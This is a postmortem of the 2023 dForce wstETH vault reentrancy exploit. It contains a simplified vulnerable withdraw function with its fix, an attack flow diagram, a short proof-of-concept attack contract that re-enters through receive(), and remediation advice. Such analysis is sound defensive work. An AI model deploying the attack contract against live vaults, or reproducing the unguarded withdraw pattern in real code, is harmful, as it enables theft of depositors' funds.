# dForce — Reentrancy Attack Analysis (2023)

| Field | Details |
|------|------|
| **Date** | 2023-02-10 |
| **Protocol** | dForce |
| **Chain** | Arbitrum / Optimism |
| **Loss** | ~3.65M USD |
| **Attacker** | Unknown |
| **Attack Tx** | Arbitrum/Optimism transactions |
| **Vulnerable Contract** | dForce wstETH Vault |
| **Root Cause** | Missing reentrancy protection on wstETH Curve pool calls |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/dForce_exp.sol) |

---
## 1. Vulnerability Overview

The dForce wstETH vault manages assets through Curve's wstETH-ETH pool. Certain functions in the Curve pool can trigger a callback when transferring ETH. Through this callback, an attacker was able to reenter the dForce vault and withdraw the same assets multiple times. dForce had previously suffered a reentrancy attack in 2020, indicating that historical lessons were not sufficiently incorporated to prevent recurrence.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable dForce vault: reentrancy possible during Curve ETH transfer
function withdraw(uint256 shares) external {
    uint256 assets = convertToAssets(shares);

    // ❌ ETH withdrawn from Curve pool before state update (callback possible)
    curvePool.remove_liquidity_one_coin(lpAmount, ETH_INDEX, minAmount);
    // ↑ ETH transfer triggers receive() callback → reentrancy possible

    // On reentry, shares have not yet been burned — second withdrawal succeeds
    _burn(msg.sender, shares);  // ❌ State update too late
    payable(msg.sender).transfer(assets);
}

// ✅ Fixed
function withdraw(uint256 shares) external nonReentrant {
    uint256 assets = convertToAssets(shares);
    _burn(msg.sender, shares);  // ✅ State update first
    curvePool.remove_liquidity_one_coin(lpAmount, ETH_INDEX, minAmount);
    payable(msg.sender).transfer(assets);
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: missing reentrancy protection on wstETH Curve pool calls
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract
  │
  ├─1─▶ Deposit wstETH into dForce vault → receive shares
  │
  ├─2─▶ Call dForce.withdraw(shares)
  │       │
  │       ├─▶ Withdraw ETH from Curve wstETH-ETH pool
  │       │    ETH transfer → triggers attacker's receive()
  │       │    │
  │       │    └─3─▶ Reenter from receive()
  │       │             Re-call dForce.withdraw()
  │       │             Shares not yet burned → second withdrawal succeeds
  │       │
  │       └─▶ Burn shares (after double withdrawal already completed)
  │
  └─4─▶ Profit from double-withdrawn ETH/wstETH
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    IDForceVault vault;
    bool attacking = false;

    function attack() external {
        // 1. Deposit wstETH into vault
        wstETH.approve(address(vault), depositAmount);
        vault.deposit(depositAmount);

        // 2. Initiate withdrawal (triggers reentrancy)
        vault.withdraw(vault.balanceOf(address(this)));
    }

    // ETH receive callback (reentrancy entry point)
    receive() external payable {
        if (!attacking && vault.balanceOf(address(this)) > 0) {
            attacking = true;
            // Withdraw again while shares have not yet been burned
            vault.withdraw(vault.balanceOf(address(this)));
            attacking = false;
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack (Cross-Function Reentrancy) |
| **Attack Vector** | Curve ETH transfer callback + reentrancy |
| **Impact Scope** | dForce vault depositors |
| **DASP Classification** | Reentrancy |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |

## 6. Remediation Recommendations

1. **Apply ReentrancyGuard universally**: Add `nonReentrant` modifier to all withdrawal functions.
2. **Update state before ETH transfer**: Strictly enforce the Checks-Effects-Interactions (CEI) pattern.
3. **Block ETH callbacks**: Prevent calls to reentrant-vulnerable functions from within `receive()`.

## 7. Lessons Learned

- dForce was exploited via reentrancy in 2020 (ERC-777 reentrancy) and again in 2023. Historical lessons repeat themselves when they are not genuinely incorporated into practice.
- Any function involving ETH transfers should automatically be treated as a reentrancy risk.
- Being simultaneously attacked on both Arbitrum and Optimism underscores the importance of maintaining consistent security standards across multi-chain deployments.